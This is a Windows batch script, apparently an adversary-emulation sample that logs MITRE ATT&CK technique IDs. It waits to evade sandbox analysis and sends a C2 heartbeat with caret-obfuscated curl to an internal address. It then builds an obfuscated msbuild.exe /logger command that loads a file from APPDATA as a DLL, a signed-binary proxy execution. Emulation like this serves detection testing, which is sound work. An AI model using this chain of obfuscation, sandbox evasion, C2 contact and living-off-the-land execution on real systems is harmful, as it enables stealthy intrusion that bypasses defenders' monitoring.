@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random variable names with PHR_ placeholders as plain literal values
SET txisnba=%APPDATA%\8244\5424077f
SET mdvfmsbx=https://10.0.0.49
SET keghkgto=https://10.0.0.49/stage/2/icon.png?8244-7
SET jwcnifl=ITZEL-S2BO
SET rrocubc=7
SET xzanpex=illustrator.txt
SET dvhhyc=8244

REM Set log file path using PHR_ placeholder
SET vbdhshf=%APPDATA%\!rrocubc!\macula-simulations.log

REM Create log directory if it doesn't exist
IF NOT EXIST "%APPDATA%\!rrocubc!" (
    mkdir "%APPDATA%\!rrocubc!" >nul 2>&1
)

REM Initial delay to evade sandbox analysis (30-60s)
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: initial_delay_start=30s>>> "!vbdhshf!" 2>nul
timeout /t 30 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: initial_delay_complete>>> "!vbdhshf!" 2>nul

REM C2 heartbeat - FIRST TASK
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: heartbeat_start=!keghkgto!>>> "!vbdhshf!" 2>nul
SET hgdhkj=c^u^r^l
SET mncvgh=-k -s -o nul "!keghkgto!"
!hgdhkj! !mncvgh!
IF !ERRORLEVEL! EQU 0 (
    SET ttp_result=1
    SET ttp_error=
) ELSE (
    SET ttp_result=0
    SET ttp_error=connection_failed
)

REM Build timestamp for TTP logging
SET uujsks=!DATE!
SET uujsks=!uujsks:~-4!-!uujsks:~-7,2!-!uujsks:~-10,2!
SET uyybds=!TIME!
IF "!uyybds:~0,1!"==" " SET uyybds=0!uyybds:~1!
SET usyduf=!uyybds:~0,8!.!uyybds:~9,3!

REM Log TTP execution for heartbeat (T1105 Ingress Tool Transfer)
echo [%usyduf%][!jwcnifl!]: !rrocubc!-!dvhhyc!-T1105|Ingress Tool Transfer=!ttp_result!:!ttp_error!>> "!vbdhshf!" || rem

echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: heartbeat_complete=errorlevel:!ERRORLEVEL!>>> "!vbdhshf!" 2>nul

REM Delay between operations (varying methods)
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: intermediate_delay_start=15s>>> "!vbdhshf!" 2>nul
ping -n 15 127.0.0.1 >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: intermediate_delay_complete>>> "!vbdhshf!" 2>nul

REM Obfuscated msbuild.exe command construction using caret escapes
SET yhkjhn=m^s^b^u^i^l^d
SET qazxsw=.^e^x^e
SET wsxedc=!yhkjhn!!qazxsw!

REM Obfuscate /logger argument with variable fragmentation
SET mnbvcx=/l^o^g^g^e^r
SET lkjhgf=:L^o^g^g^e^r^E^n^t^r^y^,
SET poiuy=;M^y^P^a^r^a^m^e^t^e^r^s^,^F^o^o

REM Construct full DLL path with PHR_ placeholders
SET zxcvbn=!txisnba!\!xzanpex!

REM Build complete command
SET qwerty=!mnbvcx!!lkjhgf!!zxcvbn!!poiuy!

REM Random delay before execution
SET /A plmokn=%RANDOM% %% 20 + 10
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: random_delay_start=!plmokn!s>>> "!vbdhshf!" 2>nul
timeout /t !plmokn! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: random_delay_complete>>> "!vbdhshf!" 2>nul

REM Execute msbuild with LoggerEntry class
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: msbuild_start=!wsxedc! !qwerty!>>> "!vbdhshf!" 2>nul
!wsxedc! !qwerty!
IF !ERRORLEVEL! EQU 0 (
    SET ttp_result2=1
    SET ttp_error2=
) ELSE (
    SET ttp_result2=0
    SET ttp_error2=execution_failed
)

REM Build timestamp for second TTP log
SET uujsks2=!DATE!
SET uujsks2=!uujsks2:~-4!-!uujsks2:~-7,2!-!uujsks2:~-10,2!
SET uyybds2=!TIME!
IF "!uyybds2:~0,1!"==" " SET uyybds2=0!uyybds2:~1!
SET usyduf2=!uyybds2:~0,8!.!uyybds2:~9,3!

REM Log TTP execution for T1218 Signed Binary Proxy Execution
echo [%usyduf2%][!jwcnifl!]: !rrocubc!-!dvhhyc!-T1218|Signed Binary Proxy Execution=!ttp_result2!:!ttp_error2!>> "!vbdhshf!" || rem

echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: msbuild_complete=errorlevel:!ERRORLEVEL!>>> "!vbdhshf!" 2>nul

REM Final delay
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: final_delay_start=10s>>> "!vbdhshf!" 2>nul
CHOICE /C Y /N /D Y /T 10 >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: script_complete>>> "!vbdhshf!" 2>nul

ENDLOCAL